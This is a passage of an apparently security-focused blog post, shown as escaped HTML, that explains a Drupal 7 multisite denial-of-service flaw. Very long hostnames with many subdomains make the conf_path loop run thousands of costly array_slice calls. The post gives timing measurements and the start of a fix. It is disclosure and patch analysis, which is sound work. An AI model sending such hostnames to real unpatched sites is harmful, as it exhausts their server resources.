      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/sites.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// This will overwrite $sites with the desired mappings.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/sites.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
      &lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_NAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_NAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_FILENAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rtrim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_HOST&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))));&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$require_settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$confdir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$confdir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/default&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;What this code does is testing the requested hostname to see if a specific settings directory exists for this Host; this is the &lt;strong&gt;core functionality of drupal multisites&lt;/strong&gt;. By default you have the &lt;em&gt;default&lt;/em&gt; settings in the directory &lt;code&gt;&amp;lt;www&amp;gt;/sites/default&lt;/code&gt;, you can then use a &lt;code&gt;&amp;lt;www&amp;gt;/sites/sites.php&lt;/code&gt; file to map hostnames with other settings files -- but this will only cover names that you &lt;strong&gt;do&lt;/strong&gt; have, not the bad ones --, and you &lt;em&gt;can&lt;/em&gt; also have some directories based on the hostname, or part of it, containing a &lt;code&gt;settings.php&lt;/code&gt; file. Note that you &lt;strong&gt;cannot suspend this multisite feature&lt;/strong&gt;, it's always there, no opt-in or opt-out until Drupal 8 release.&lt;/p&gt;

&lt;p&gt;If the hostname is &lt;code&gt;www.example.com:8080&lt;/code&gt; and the bootstraped drupal file is &lt;code&gt;&amp;lt;www&amp;gt;/index.php&lt;/code&gt;, Drupal will check for theses files (in this order):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;www/sites/8080.www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/default/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;If the hostname is &lt;code&gt;www.example.com:8080&lt;/code&gt; and the bootstraped drupal file is &lt;code&gt;www/modules/statistics/statistics.php&lt;/code&gt;, Drupal will check theses files:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;www/sites/8080.www.example.com.modules.statistics/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com.modules.statistics/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/example.com.modules.statistics/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/com.modules.statistics/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/8080.www.example.com.modules/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com.modules/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/example.com.modules/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/com.modules/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/8080.www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/default/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Yep, I'm not sure anyone is really using that feature, but that's what this code does.&lt;/p&gt;

&lt;p&gt;If one file is found before the default one, then it is used, you can alter settings in this file to connect another database, or use another &lt;code&gt;base_url&lt;/code&gt; or &lt;code&gt;database_prefix&lt;/code&gt;, or alter any setting in fact, the multisites feature things.&lt;/p&gt;

&lt;p&gt;As you can see using the &lt;code&gt;sites/sites.php&lt;/code&gt; to set your hostname-to-directory mapping is quite certainly a good thing to do in terms of performances (this search loop is avoided). Remember that theses file checks are done for &lt;strong&gt;every&lt;/strong&gt; HTTP requests received by Drupal.&lt;/p&gt;

&lt;p&gt;Now re-read the patch, before this patch very long hostnames could be used, and you could use a very big number of subdomains... and for each subdomain you add several locations to check for a setting file...&lt;/p&gt;

&lt;p&gt;This is where I came and then I made some evil tests to see how this multisite code would react with bad hostnames. Working only with the allowed characters (alphabetical letters, digits, dots, &lt;code&gt;:&lt;/code&gt;) we can at least play with this deep settings files search. And the &lt;code&gt;sites.php&lt;/code&gt; map shortcuts won't be used for bad hostnames.&lt;/p&gt;

&lt;h3&gt;And then the DOS issue&lt;/h3&gt;

&lt;p&gt;So, you may think the issue is on the &lt;code&gt;file_exists&lt;/code&gt; calls, as we will run several thousands of file_exists, searching for the first match if we set a hostname with a lot of subdomains. Strangely this is usually quite fast.&lt;/p&gt;

&lt;p&gt;The real issue is on &lt;code&gt;array_slice&lt;/code&gt;, performing several thousands of inverted array_slice is &lt;em&gt;really very very slow&lt;/em&gt;. The first ones are quite fast but the last steps are longer, and we will make several thousands of array_slice operations.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;ARRAY_SLICE array of &amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; elts =&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;microtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;microtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$time_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;time for array_slice to &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; : &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$time&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; (s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -10    : 0.0004069805 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -100   : 0.0004091262 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -500   : 0.0004727840 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -1000  : 0.0005030632 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -4000  : 0.0010337829 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -8000  : 0.0016450881 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -12000 : 0.0018289089 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -14000 : 0.0025160312 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -16000 : 0.0032360553 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;0.003s seems quite fast, but that's already 7.5 times more than the first array_slices. I made a simple graph to show theses times growth.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/theme/img/posts/graph_array_slice.png&quot; width=&quot;600&quot; height=&quot;463&quot; alt=&quot;array_slice time graph for 16000 elements&quot;/&gt;&lt;/p&gt;

&lt;p&gt;And each of theses times are computed for &lt;strong&gt;1 extraction&lt;/strong&gt; -- like extracting the array of 16 000 elements to index -12 000 --, but the loop is extracting all values. One at each call of the loop.&lt;/p&gt;

&lt;p&gt;The loop is &lt;strong&gt;stacking&lt;/strong&gt; each of theses times, with 16 000 elements the last array_slice is 0.003s but the sum of all theses &lt;code&gt;array_slice&lt;/code&gt; calls is ... &lt;strong&gt;52 seconds!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;My first fix used an &lt;code&gt;array_walk&lt;/code&gt; call to prepare all names that should be checked, instead of rebuilding this name on the loop, this way:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     * Apply this function with an array_walk to obtain an array with names that&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     * need to be tested.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;prepare_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$rev_server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
